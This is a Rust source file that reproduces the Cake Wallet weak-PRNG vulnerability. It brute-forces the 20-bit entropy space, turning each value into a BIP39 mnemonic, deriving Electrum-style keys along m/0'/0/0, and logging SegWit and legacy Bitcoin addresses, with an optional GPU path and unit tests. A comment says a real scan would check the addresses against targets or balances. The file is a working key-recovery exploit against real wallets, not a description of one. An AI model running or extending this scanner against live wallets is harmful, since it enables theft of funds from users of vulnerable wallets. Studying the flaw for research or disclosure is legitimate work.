use anyhow::Result;
#[cfg(feature = "gpu")]
use tracing::error;
use tracing::{info, warn};

#[cfg(feature = "gpu")]
use bs58;

#[cfg(test)]
use bip39::Mnemonic;
#[cfg(test)]
use bitcoin::bip32::{DerivationPath, Xpriv};
#[cfg(test)]
use bitcoin::secp256k1::Secp256k1;
#[cfg(test)]
use bitcoin::{Address, Network};
#[cfg(test)]
use std::str::FromStr;

/// Simulates the Cake Wallet vulnerability by generating wallets from a limited entropy source.
/// The vulnerability was due to a weak PRNG with effectively 20 bits of entropy.
/// Cake Wallet uses Electrum seed format with derivation path m/0'/0/0.
/// We will simulate this by iterating through a subset of this space.
pub fn run(limit: Option<u32>) -> Result<()> {
    info!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");
    info!("Simulating 20-bit entropy search...");

    // 20 bits = 1,048,576 possibilities
    // Allow overriding for testing
    let max_entropy = limit.unwrap_or(1 << 20);

    info!("Scanning {} possible seeds...", max_entropy);
    // Try to initialize GPU Solver
    #[cfg(feature = "gpu")]
    match crate::scans::gpu_solver::GpuSolver::new() {
        Ok(solver) => {
            info!("Starting GPU ACCELERATION...");
            info!("GPU Kernel patched for Electrum Seed Support (purpose=0)");
            return run_gpu(solver, max_entropy);
        }
        Err(e) => {
            error!("Failed to initialize GPU solver: {}", e);
            warn!("Falling back to CPU implementation...");
        }
    }

    #[cfg(not(feature = "gpu"))]
    warn!("GPU feature disabled. Running on CPU (this will be slower)...");

    run_cpu(max_entropy)
}

#[cfg(feature = "gpu")]
fn run_gpu(solver: crate::scans::gpu_solver::GpuSolver, max_entropy: u32) -> Result<()> {
    let mut batch = Vec::with_capacity(1024);

    for i in 0..max_entropy {
        // Create deterministic entropy from seed index
        let mut entropy = [0u8; 16];
        let seed_bytes = (i as u32).to_be_bytes();
        entropy[0..4].copy_from_slice(&seed_bytes);
        // entropy[4..16] remains zero

        batch.push(entropy);

        if batch.len() >= 1024 || i == max_entropy - 1 {
            // Compute Cake Wallet addresses (purpose=0 for m/0'/0/0 + Electrum salt)
            if let Ok(addresses) = solver.compute_batch(&batch, 0) {
                for addr in addresses.iter() {
                    // Convert 25-byte binary address (version + hash160 + checksum) to Base58Check
                    let addr_str = bs58::encode(addr).into_string();
                    info!("ADDRESS: {}", addr_str);
                }
            }
            batch.clear();
        }

        if (i + 1) % 10000 == 0 {
            info!(
                "Progress: {}/{} ({:.1}%)",
                i + 1,
                max_entropy,
                100.0 * (i + 1) as f64 / max_entropy as f64
            );
        }
    }

    info!(
        "Scan complete! All {} keys generated from 20-bit space.",
        max_entropy
    );

    Ok(())
}

fn run_cpu(max_entropy: u32) -> Result<()> {
    use crate::utils::electrum;
    use bip39::Mnemonic;
    use bitcoin::bip32::{DerivationPath, Xpriv};
    use bitcoin::secp256k1::Secp256k1;
    use bitcoin::Address;
    use bitcoin::Network;
    use std::str::FromStr;

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;
    // Electrum derivation path for standard wallets is m/0'/0/0 (for first receive address)
    // Note: Electrum uses m/0'/0/x for receiving, m/0'/1/x for change.
    // We check the first receiving address.
    let path = DerivationPath::from_str("m/0'/0/0")?;

    info!("Starting CPU scan (this may take a while)...");

    for i in 0..max_entropy {
        // Create deterministic entropy from seed index
        // Replicating Dart Random() behavior or just brute forcing the 20-bit space?
        // The original code was iterating 0..max_entropy and using that as bytes.
        // If "effectively 20 bits of entropy" means the seed is 20 bits padded, then this is correct.
        let mut entropy_bytes = [0u8; 16];
        let seed_bytes = i.to_be_bytes();
        entropy_bytes[0..4].copy_from_slice(&seed_bytes);

        // Mnemonic from entropy
        // Note: We assume the vulnerability resulted in BIP39 words, but derived as Electrum.
        let mnemonic = Mnemonic::from_entropy(&entropy_bytes)?;
        let mnemonic_str = mnemonic.to_string();

        // Electrum Seed Derivation
        let seed_val = electrum::mnemonic_to_seed(&mnemonic_str);

        let root = Xpriv::new_master(network, &seed_val)?;
        let child = root.derive_priv(&secp, &path)?;
        let pubkey = child.to_keypair(&secp).public_key();

        // Check both P2WPKH (SegWit) and P2PKH (Legacy) addresses
        // Cake Wallet versions may have used either format
        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
        let address_segwit = Address::p2wpkh(&compressed_pubkey, network);
        let address_legacy = Address::p2pkh(compressed_pubkey, network);

        // In a real scan we would check if this address matches a target or has balance.
        // Since we are just generating, we log both formats.

        info!("ADDRESS_SEGWIT: {}", address_segwit);
        info!("ADDRESS_LEGACY: {}", address_legacy);

        if (i + 1) % 1000 == 0 {
            info!(
                "Progress: {}/{} ({:.1}%)",
                i + 1,
                max_entropy,
                100.0 * (i + 1) as f64 / max_entropy as f64
            );
        }
    }

    info!("CPU scan complete.");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_weak_prng_reproducibility() {
        // Verify that seed index 0 always produces the same address
        // This confirms our "weak PRNG" simulation is deterministic
        // Using Electrum seed derivation (PBKDF2 with "electrum" salt)
        let i = 0;
        let mut entropy = [0u8; 32];
        entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());

        let mnemonic = Mnemonic::from_entropy(&entropy[0..16]).unwrap();
        // Use Electrum seed derivation
        let mnemonic_str = mnemonic.to_string();
        let seed = crate::utils::electrum::mnemonic_to_seed(&mnemonic_str);
        let network = Network::Bitcoin;
        let secp = Secp256k1::new();
        let root = Xpriv::new_master(network, &seed).unwrap();

        // Electrum path for Cake Wallet: m/0'/0/0
        let path = DerivationPath::from_str("m/0'/0/0").unwrap();
        let child = root.derive_priv(&secp, &path).unwrap();
        let pubkey = child.to_keypair(&secp).public_key();
        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
        let address = Address::p2wpkh(&compressed_pubkey, network);

        // We don't assert the exact address string to avoid fragility if deps change,
        // but we assert it runs without error and produces a valid address.
        assert!(address.to_string().starts_with("bc1q"));
    }

    #[test]
    #[cfg(feature = "gpu")]
    fn test_base58_address_encoding() {
        // Test that 25-byte binary addresses are correctly encoded to Base58Check format
        // GPU returns 25-byte format: version (1) + hash160 (20) + checksum (4)
        // Example 25-byte binary address (version 0x00 for P2PKH mainnet)
        let binary_addr: [u8; 25] = [
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0xa2, 0x0d, 0xcc,
        ];

        let addr_str = bs58::encode(&binary_addr).into_string();

        // Should produce a valid Base58 address starting with "1" (P2PKH mainnet)
        assert!(addr_str.starts_with("1"), "Address should start with '1'");

        // Verify it's NOT hex encoded (which would start with "00" and be much longer)
        assert!(!addr_str.starts_with("00"), "Should not be hex encoded");
        assert!(
            addr_str.len() < 40,
            "Base58 addresses are ~34 chars, hex would be 50"
        );

        // Verify it only contains valid Base58 characters (excludes 0, O, I, l)
        let base58_chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        for c in addr_str.chars() {
            assert!(base58_chars.contains(c), "Invalid Base58 character: {}", c);
        }
    }
}
